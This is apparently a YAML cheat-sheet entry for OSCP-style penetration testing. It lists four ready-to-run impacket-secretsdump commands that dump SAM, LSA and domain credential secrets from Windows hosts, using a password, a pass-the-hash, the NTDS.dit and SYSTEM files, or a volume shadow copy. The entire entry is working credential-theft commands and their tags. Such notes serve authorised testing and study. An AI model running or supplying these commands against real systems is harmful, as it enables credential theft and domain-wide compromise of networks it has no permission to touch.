---
variants:
  - label: creds
    command: |
      impacket-secretsdump $DOMAIN/$USER:$PASSWORD@$IP
  - label: hash
    command: |
      impacket-secretsdump $DOMAIN/$USER@$IP -hashes :$HASH
  - label: ntds
    command: |
      impacket-secretsdump -dc-ip $IP -ntds C:\Windows\NTDS\ntds.dit -system C:\Windows\System32\Config\system $DOMAIN/$USER:$PASSWORD@$IP
  - label: vss
    command: |
      impacket-secretsdump $DOMAIN/$USER@$IP -hashes :$HASH -use-vss
description: Dump SAM, LSA, and domain secrets with impacket, by source/auth.
os: [Linux]
category: [oscp, cli]
have: [hash]
service: [SMB]
phase: [PrivEsc]
references:
  - https://github.com/fortra/impacket
---
